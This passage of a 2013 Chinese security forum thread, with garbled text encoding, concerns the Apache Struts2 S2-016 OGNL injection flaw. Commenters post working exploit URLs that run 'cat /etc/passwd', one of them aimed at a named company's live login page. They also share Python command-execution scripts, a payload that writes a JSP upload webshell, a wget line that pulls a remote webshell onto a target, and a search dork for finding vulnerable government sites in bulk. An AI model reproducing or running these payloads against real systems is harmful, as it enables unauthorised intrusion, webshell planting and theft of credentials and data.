href="http://www.xxx.com/xxxx.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D">http://www.xxx.com/xxxx.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</a></a>
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13018#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=2313" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/angellover08" target="_blank">angellover08 </a> (1çº§) æŸç”²æ–¹æ¼æ´æŒ–æ˜ç ”ç©¶å‘˜ <a href=""></a> 2013-07-17    19æ¥¼</li>
</ul>
<p>freebufå¤§ç‰›ä¼—å¤šï¼Œå°å¼Ÿåœ¨æ­¤è†œæ‹œã€‚
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13019#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3210" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/xiao_hen" target="_blank">xiao_hen </a> (1çº§)  çŸ®ç©·æŒ«å°åˆ†é˜Ÿã€‚ <a href=""></a> 2013-07-17    20æ¥¼</li>
</ul>
<p>freebufå¤§ç‰›ä¼—å¤šï¼Œå°å¼Ÿåœ¨æ­¤è†œæ‹œã€‚
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13020#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3692" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/dennych0u" target="_blank">dennych0u </a> (1çº§)  <a href=""></a> 2013-07-17    21æ¥¼</li>
</ul>
<p>æ‚²å‚¬çš„æ”»åŸç‹®ä»¬è¦ç²¾å°½äººäº¡äº†~
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13021#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> z0mbie <a href=""></a> 2013-07-17    22æ¥¼</li>
</ul>
<p>è¯·æ•™å„è·¯ç¥ä»™ï¼Œæ€ä¹ˆåå¼¹SHELL,æ€ä¹ˆå†™shell
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13025#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> helenæ˜¯sb <a href=""></a> 2013-07-17    23æ¥¼</li>
</ul>
<p>getshell
wget <a href="http://www.sss.com/data/avatar/test.txt" target="_blank"><a href="http://www.sss.com/data/avatar/test.txt">http://www.sss.com/data/avatar/test.txt</a></a> -O /home/www/test.jsp
test.txtæ˜¯è¿œç¨‹webshellçš„ /home/www/test.jsp æ˜¯ç›®æ ‡ç›®å½•
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13027#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3486" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hackmissmiss" target="_blank">hackmissmiss </a> (1çº§)  <a href=""></a> 2013-07-17    24æ¥¼</li>
</ul>
<p>æ€ä¹ˆæ„é€ WGET POC
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13030#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/free" target="_blank">free </a> (1çº§) å¥³äººå¿ƒçœ‹ä¸é€ï¼Œå› ä¸ºèƒ¸å‰è‚‰å¤ªåšã€‚ <a href=""></a> 2013-07-17    25æ¥¼</li>
</ul>
<p>æ±‚å·¥å…·å•Š
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13031#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> h4ck0r <a href=""></a> 2013-07-17    26æ¥¼</li>
</ul>
<p>æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š
example:python test.py <a href="http://baidu.com/test.action" target="_blank"><a href="http://baidu.com/test.action">http://baidu.com/test.action</a></a> cat /etc/passwd</p>
<p>import urllib2,sys,re</p>
<p>def get(url, data):
string = url + â€œ?â€ + data
req = urllib2.Request(â€œ%sâ€%string)
response = urllib2.urlopen(req).read().strip()
print strip(response)</p>
<p>def strip(str):
tmp = str.strip()
blank_line=re.compile(â€˜\x00â€²)
tmp=blank_line.sub(â€,tmp)
return tmp</p>
<p>if <strong>name</strong> == â€˜<strong>main</strong>â€™:
url = sys.argv[1]
cmd = sys.argv[2]
cmd1 = sys.argv[3]
attack=â€redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{â€˜%sâ€™,&#39;%sâ€™})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(â€˜com.opensymphony.xwork2.dispatcher.HttpServletResponseâ€™),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}â€%(cmd,cmd1)
get(url,attack)
<a href="">äº®äº†</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13033#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> Hell0w0rld <a href=""></a> 2013-07-17</li>
</ul>
<p>@h4ck0r IndentationError: expected an indented block
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13035#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> coffee <a href=""></a> 2013-07-17    27æ¥¼</li>
</ul>
<p>æˆ‘æ¥ä¸ªå†™shellçš„å§,å½“å‰ç›®å½•ç”Ÿæˆtest.jsp
?redirect:${
%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),
%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;),
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
}&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</p>
<p>ç„¶åç”¨ä»¥ä¸‹ä»£ç å†™shell:</p>
<p><form action="[http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post"></p>
<p><textarea >code</textarea></p>
<p><input type=submit value="æäº¤">
</form>
ä¸Šå‰ç›®å½•ç”Ÿæˆ1.jsp</p>
<p><a href="">äº®äº†</a>(4)
<a href="http://www.freebuf.com/vuls/?replytocom=13034#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> apo <a href=""></a> 2013-07-18</li>
</ul>
<p>@coffee æˆ‘æ¥ä¸ªå†™shellçš„å§,å½“å‰ç›®å½•ç”Ÿæˆtest.jsp</p>
<p>?redirect:${
%23req%3d%23context.get(â€˜com.opensymphony.xwork2.dispatcher.HttpServletRequestâ€™),
%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;),
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
}&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</p>
<p>ç„¶åç”¨ä»¥ä¸‹ä»£ç å†™shell:</p>
<p><form action="[http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post"></p>
<p><textarea name=t>code</textarea></p>
<p><input type=submit value="æäº¤">
</form>
ä¸Šå‰ç›®å½•ç”Ÿæˆ1.jsp</p>
<p>å°‘äº†ä¸€ä¸ªname=t <textarea name=t>code</textarea>
<a href="">äº®äº†</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13041#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> window <a href=""></a> 2013-07-18</li>
</ul>
<p>@apo èƒ½ç”Ÿå­˜test.jspä¸èƒ½ç”Ÿæˆ1.jspå•Šï¼
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13042#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> apo <a href=""></a> 2013-07-18</li>
</ul>
<p>@window &lt;form action=&quot;<a href="http://www.***.jp/acdap/test.jsp?f=1.jsp&quot;" target="_blank"><a href="http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot">http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot</a></a>; method=&quot;post&quot;</p>
<p>æ¥¼ä¸»å¥½åƒä¼°è®¡å¼„é”™ä¸¤ä¸ªåœ°æ–¹ã€‚</p>
<p>è¿™æ ·å°±å¯ä»¥äº†ã€‚
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13044#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> window <a href=""></a> 2013-07-18</li>
</ul>
<p>@apo è¿˜æ˜¯ä¸èƒ½ ï¼Œ
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13087#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> apo <a href=""></a> 2013-07-19</li>
</ul>
<p>@window
é‚£æˆ‘å°±æ²¡åŠæ³•äº†ã€‚è¡¥è¡¥HTMLçŸ¥è¯†ã€‚ã€‚
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13094#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> tianya <a href=""></a> 2013-07-18    28æ¥¼</li>
</ul>
<p>å°±æœ¨æœ‰äººå‘å¦‚ä½•ä¿®å¤ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13036#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> sudnog <a href=""></a> 2013-07-18    29æ¥¼</li>
</ul>
<p>JSPå¦‚ä½•æ‹–åº“ï¼Ÿæ•°æ®åº“çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬æ˜¯å“ªé‡Œï¼ŸSTRUTS2è®©æˆ‘ç¬¬ä¸€æ¬¡æœ‰æœºä¼šæ¥è§¦åˆ°äº†jsp~~æ±‚æ•™å„ä½ï¼
<a href="">äº®äº†</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13038#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> Iamnothacker <a href=""></a> 2013-07-18    30æ¥¼</li>
</ul>
<p>ç”¨googleå‘ç°äº†ä¸å°‘ï¼Œç¡®å®å¯ä»¥æ‰¹é‡æŠ“äº†:
site:gov.cn inurl:index.action
<a href="">äº®äº†</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13039#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> www <a href=""></a> 2013-07-18    31æ¥¼</li>
</ul>
<p>windowsæ€ä¹ˆæï¼Ÿæ€ä¹ˆwget
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13043#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> æŠ è„šå¤§æ±‰ <a href=""></a> 2013-07-18    32æ¥¼</li>
</ul>
<p><a href="http://hack.xiaoip.com/hack.php" target="_blank"><a href="http://hack.xiaoip.com/hack.php">http://hack.xiaoip.com/hack.php</a></a>
åœ¨çº¿ç‰ˆæ¼æ´åˆ©ç”¨å·¥å…·æ”¾å‡º~~~å‚»ç“œåŒ–äº†ã€‚
<a href="">äº®äº†</a>(4)
<a href="http://www.freebuf.com/vuls/?replytocom=13045#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3907" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hack" target="_blank">hack </a> (1çº§)  <a href=""></a> 2013-07-18    33æ¥¼</li>
</ul>
<p>æ±‚åŠ©ï¼Œæˆ‘ç”¨æ‰§è¡Œä»»æ„å‘½ä»¤EXP,å¾—åˆ°ä¸€ä¸ª/etc/passwdåæœ‰ä»€ä¹ˆç”¨å•Š?è¿˜æœ‰å«æ‰§è¡Œä»»æ„å‘½ä»¤,æ˜¯æŒ‡å“ªäº›å‘½ä»¤èƒ½æ‰§è¡Œå•Šï¼Ÿæ±‚å¤§ç‰›ä¸ºå°èœè§£æƒ‘ï¼Œå…¥å…¥é—¨ <img src="" alt=":???:">
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13048#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3881" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/n0bele" target="_blank">n0bele </a> (1çº§)  <a href=""></a> 2013-07-18    34æ¥¼</li>
</ul>
<p>/etc/passwdç”¨æˆ·åè¡¨
/etc/shadowå¯†ç 
æ ¹æ®æƒé™çœ‹å‘½ä»¤èŒƒå›´
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13049#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3907" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hack" target="_blank">hack </a> (1çº§)  <a href=""></a> 2013-07-18    35æ¥¼</li>
</ul>
<p>å“¦ï¼ŒåŸç†ä¸æ˜¯å¾ˆæ‡‚ï¼Œä¸è¿‡å¤§æ¦‚æ˜¯æ¸…æ¥šäº†ï¼Œå¯¹äº†ï¼Œè¿™å‡ ä¸ªéƒ½æ˜¯é’ˆå¯¹linuxçš„ï¼Œé‚£ä¸çŸ¥é“windowsä¸‹æ˜¯ä»€ä¹ˆå‘½ä»¤ï¼Œæˆ‘åªè®°å¾—æ˜¯ä¸€ä¸ªå•è¯ï¼Œifä»€ä¹ˆçš„å¥½åƒï¼Œè¿˜æ˜¯åˆ«çš„ä»€ä¹ˆï¼Œè®°ä¸èµ·æ¥äº†
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13050#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> anonymous <a href=""></a> 2013-07-18    36æ¥¼</li>
</ul>
<p>å¥½å¤šè£…é€¼é’å¹´åœ¨è¡ŒåŠ¨ï¼Œè¿å°¼ç›windowså‘½ä»¤éƒ½ä¸ç†Ÿæ‚‰è¿˜æ—¥ä¸ªJBã€‚
<a href="">äº®äº†</a>(5)
<a href="http://www.freebuf.com/vuls/?replytocom=13067#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> 222 <a href=""></a> 2013-07-18    37æ¥¼</li>
</ul>
<p>5555
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13068#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> éª‘å£« <a href=""></a> 2013-07-18    38æ¥¼</li>
</ul>
<p><a href="http://netknight.in/archives/436/" target="_blank"><a href="http://netknight.in/archives/436/">http://netknight.in/archives/436/</a></a>
åˆ©ç”¨å·¥å…·åœ¨è¿™æˆ‘ä¼šä¹±è¯´ä¹ˆ
<a href="">äº®äº†</a>(3)
<a href="http://www.freebuf.com/vuls/?replytocom=13091#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> z0mbie <a href=""></a> 2013-07-19    39æ¥¼</li>
</ul>
<p>è¯·æ•™å„ä½ï¼Œ.doåç¼€åæ€ä¹ˆå…¥ä¾µï¼Ÿ
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13123#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1604" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/redcar" target="_blank">redcar </a> (1çº§)  <a href=""></a> 2013-07-20    40æ¥¼</li>
</ul>
<p>è¯·é—®å“ªä½çŸ¥é“è¿™ä¸ªredirectçš„åŠŸèƒ½æ˜¯ä¸æ˜¯æŠŠ%0aæˆ–è€…%0dè¿‡æ»¤æ‰äº†ï¼Ÿå°è¯•äº†å¾ˆå¤šæ–¹æ³•ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯å§%0aå’Œ%0dç»™è½¬æ¢æˆäº†ç©ºæ ¼ã€‚å› ä¸ºçœ‹åˆ°äº†é‡å®šå‘ï¼Œæƒ³å°è¯•ä¸€ä¸‹httpåˆ†å‰²å“åº”ï¼Œè¯·é—®åˆä»€ä¹ˆç»•è¿‡æ–¹æ³•ï¼Ÿ
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13132#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3968" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/cwg2552298" target="_blank">cwg2552298 </a> (1çº§)  <a href=""></a> 2013-07-21    41æ¥¼</li>
</ul>
<p>Genius ï¼
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13142#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=645" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/è—¤çœŸ" target="_blank">è—¤çœŸ </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FBè¾¾äºº"> (1çº§) å®‰ä¿¡åæ”»é˜²å®éªŒå®¤æˆå‘˜ <a href=""></a> 2013-07-21    42æ¥¼</li>
</ul>
<p>phpç‰ˆåˆ©ç”¨å·¥å…· <a href="http://www.waitalone.cn/struts2-s2-16-exploits.html" target="_blank"><a href="http://www.waitalone.cn/struts2-s2-16-exploits.html">http://www.waitalone.cn/struts2-s2-16-exploits.html</a></a>
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13144#respond" target="_blank">å›å¤</a>
æ˜µç§°
(å¿…é¡»)æ‚¨å½“å‰å°šæœªç™»å½•ã€‚<a href="http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F11220.html" title="ç™»é™†" target="_blank">ç™»é™†</a>ï¼Ÿæ³¨å†Œ</p>
<p>é‚®ç®±
å¿…é¡»(ä¿å¯†)</p>
<p>å‘è¡¨è¨€è®ºå‰ï¼Œè¯·æ»‘åŠ¨æ»šåŠ¨æ¡è§£é”
<a href="">è¡¨æƒ…</a><a href="">æ’ä»£ç </a><a href="">æ’å›¾</a></p>
<p><a href="&quot;mrgreen&quot;"><img src="" alt=""></a><a href="&quot;razz&quot;"><img src="" alt=""></a><a href="&quot;sad&quot;"><img src="" alt=""></a><a href="&quot;smile&quot;"><img src="" alt=""></a><a href="&quot;oops&quot;"><img src="" alt=""></a><a href="&quot;grin&quot;"><img src="" alt=""></a><a href="&quot;eek&quot;"><img src="" alt=""></a><a href="&quot;???&quot;"><img src="" alt=""></a><a href="&quot;cool&quot;"><img src="" alt=""></a><a href="&quot;lol&quot;"><img src="" alt=""></a><a href="&quot;mad&quot;"><img src="" alt=""></a><a href="&quot;twisted&quot;"><img src="" alt=""></a><a href="&quot;roll&quot;"><img src="" alt=""></a><a href="&quot;wink&quot;"><img src="" alt=""></a><a href="&quot;idea&quot;"><img src="" alt=""></a><a href="&quot;arrow&quot;"><img src="" alt=""></a><a href="&quot;neutral&quot;"><img src="" alt=""></a><a href="&quot;cry&quot;"><img src="" alt=""></a><a href="&quot;?&quot;"><img src="" alt=""></a><a href="&quot;evil&quot;"><img src="" alt=""></a><a href="&quot;shock&quot;"><img src="" alt=""></a><a href="&quot;!&quot;"><img src="" alt=""></a>
æ­£åœ¨æäº¤, è¯·ç¨å€™...</p>
<p>/#</p>
<p><a href="">å–æ¶ˆ</a>   æœ‰äººå›å¤æ—¶é‚®ä»¶é€šçŸ¥æˆ‘</p>
<h3 id="-http-www-freebuf-com-donate-hot-comments-"><strong>æœ¬æ–‡è¿™äº›è¯„è®ºäº®äº†<img src="" alt=""><a href="http://www.freebuf.com/donate" target="_blank">æåŠ©æˆ‘ä»¬</a>**</strong>Hot Comments**</h3>
<p><a href="">X</a> @ 2013-07-17 15:57:23</p>
<p>?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
<a href="">äº®äº†</a> (30) <a href="">å‘½è¿</a> @ 2013-07-17 13:52:31</p>
<p>ä¸æ¯æŠ¢æ²™å‘å¥½é€Ÿåº¦ï¼Œè¯è¯´ä¹Œäº‘åˆæœ‰SBåœ¨åˆ·åˆ†äº†ã€‚é»‘äº§çš„å¤§å¥½æœºä¼šä¸æŠŠæ¡ï¼Œå‘µå‘µã€‚
<a href="">äº®äº†</a> (17) <a href="">fake</a> @ 2013-07-17 13:51:55</p>
<p><img src="http://static.freebuf.com/uploads/image/20130717/20130717015140_44183.png" alt=""> ä¹Œäº‘å·²ç»å¼€å§‹äº†â€¦â€¦é»‘é˜”ä»¬æ‹–åº“å§â€¦â€¦
<a href="">äº®äº†</a> (15) <a href="">ç”Ÿç”Ÿä¸æ¯</a> @ 2013-07-17 16:37:34</p>
<p><a href="https://kf.sf-express.com/css/loginmgmt/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}" target="_blank">https://kf.sf-express.com/css/loginmgmt/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}</a>
<a href="">äº®äº†</a> (11) <a href="">hackmissmiss</a> @ 2013-07-17 14:02:05</p>
<p>åˆ·ä½ å¦ˆçš„åˆ† ä¸€ç¾¤å°æœ‹å‹ ä¸ºäº†æ»¡è¶³è‡ªå·±çš„è™šè£å¿ƒ ä¸åœçš„æ‰¾ç½‘ç«™åˆ·åˆ† SB
<a href="">äº®äº†</a> (10) <a href="">uj70ky7b</a> @ 2013-07-17 15:52:24</p>
<p>åˆ·ä½ å¦¹å¦¹çš„åˆ†å•Šï¼Œèƒ½åƒå—. ä¸€åˆ†ç­‰äºå‡ ä¸‡å—å•Šã€‚
<a href="">äº®äº†</a> (8) <a href="">lock</a> @ 2013-07-17 17:58:10</p>
<p>import urllib2,getopt,sys def info(): print &quot;python struts.py -u <a href="http://baidu.com/test.action" target="_blank">http://baidu.com/test.action</a> -d whoami&quot; def get(url, data): string = url + &quot;?&quot; + data req = urllib2.Request(string) response = urllib2.urlopen(req) print response.read() if <strong>name</strong> == &#39;<strong>main</strong>&#39; and len(sys.argv) &lt; 2: info() try: opts, args = getopt.getopt(sys.argv[1:],&quot;u:d:&quot;) except: sys.exit(2) for opt, value in opts: if opt == &#39;-u&#39;: url = value elif opt == &#39;-d&#39;: test = value attack=&quot;?redirect:${/#a=(new java.lang.ProcessBuilder(&#39;%s&#39;)).start(),/#b=/#a.getInputStream(),/#c=new java.io.InputStreamReader(/#b),/#d=new java.io.BufferedReader(/#c),/#e=new char[50000],/#d.read(/#e),/#matt=/#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),/#matt.getWriter().println(/#e),/#matt.getWriter().flush(),/#matt.getWriter().close()}&quot;%test get(url,attack)
<a href="">äº®äº†</a> (8) <a href="">n0bele</a> @ 2013-07-17 14:01:06</p>
<p>è¿™çœŸæ˜¯ä¸ªå¥½å‚å•†ï¼Œæ²¡å®ƒé»‘å¸½å­å’Œé‚£äº›åˆåšé»‘äº§åˆåšç™½å¸½å­çš„å¸½å­éƒ½å¿«æˆ´ä¸ç¨³äº†.
<a href="">äº®äº†</a> (7) <a href="">z0mbie</a> @ 2013-07-17 14:44:12</p>
<p>å°å¼Ÿçœ‹ä¸æ‡‚ï¼Œå“ªä½èƒ½ç»™ä¸ªæ‰§è¡Œå‘½ä»¤çš„è¯­å¥
<a href="">äº®äº†</a> (7) <a href="">ç”Ÿç”Ÿä¸æ¯</a> @ 2013-07-17 13:47:58</p>
<p>ç›®æµ‹åˆ©ç”¨å·¥å…·é©¬ä¸Šå‡ºç‚‰ POCæ¥è‡ªå®˜æ–¹ï¼š <a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank">http://struts.apache.org/release/2.3.x/docs/s2-016.html</a> <a href="http://struts.apache.org/release/2.3.x/docs/s2-017.htm" target="_blank">http://struts.apache.org/release/2.3.x/docs/s2-017.htm</a> ã€‚ã€‚ç¢‰å ¡ä¸
<a href="">äº®äº†</a> (6)</p>
<h3 id="-new-posts-"><strong>æœ€æ–°å‘å¸ƒ**</strong>New Posts**</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/others-articles/11301.html" title="ç¥é©¬ï¼Ÿå…³äºå¤§æ•°æ®é»‘å®¢çš„åæ§½" target="_blank">ç¥é©¬ï¼Ÿå…³äºå¤§æ•°æ®é»‘å®¢çš„åæ§½</a></li>
<li><a href="http://www.freebuf.com/news/11336.html" title="ç ”ç©¶äººå‘˜ç§°é»‘æ‰ä¸€å¼ SIMå¡åªéœ€å‡ åˆ†é’Ÿ" target="_blank">ç ”ç©¶äººå‘˜ç§°é»‘æ‰ä¸€å¼ SIMå¡åªéœ€å‡ åˆ†é’Ÿ</a></li>
<li><a href="http://www.freebuf.com/articles/system/11305.html" title="WebServerç«¯å£é‡å®šå‘åé—¨çš„ç ”ç©¶" target="_blank">WebServerç«¯å£é‡å®šå‘åé—¨çš„ç ”ç©¶</a></li>
<li><a href="http://www.freebuf.com/news/11328.html" title="Ubuntuè®ºå›ï¼Œçº³æ–¯è¾¾å…‹äº¤æ˜“æ‰€ç½‘ç«™é­é»‘å®¢å…¥ä¾µ" target="_blank">Ubuntuè®ºå›ï¼Œçº³æ–¯è¾¾å…‹äº¤æ˜“æ‰€ç½‘ç«™é­é»‘å®¢å…¥ä¾µ</a></li>
<li><a href="http://www.freebuf.com/news/special/11326.html" title="[ä¸“é¢˜]Blackhat2013é»‘å¸½å¤§ä¼š:äº”æ¬¾å€¼å¾—ä¸€çœ‹çš„é»‘å®¢å·¥å…·" target="_blank">[ä¸“é¢˜]Blackhat2013é»‘å¸½å¤§ä¼š:äº”æ¬¾å€¼å¾—ä¸€çœ‹çš„é»‘å®¢å·¥å…·</a></li>
<li><a href="http://www.freebuf.com/news/11262.html" title="[ä¸“é¢˜]Blackhat2013ç¬¬ä¸€å¤©è®®é¢˜" target="_blank">[ä¸“é¢˜]Blackhat2013ç¬¬ä¸€å¤©è®®é¢˜</a></li>
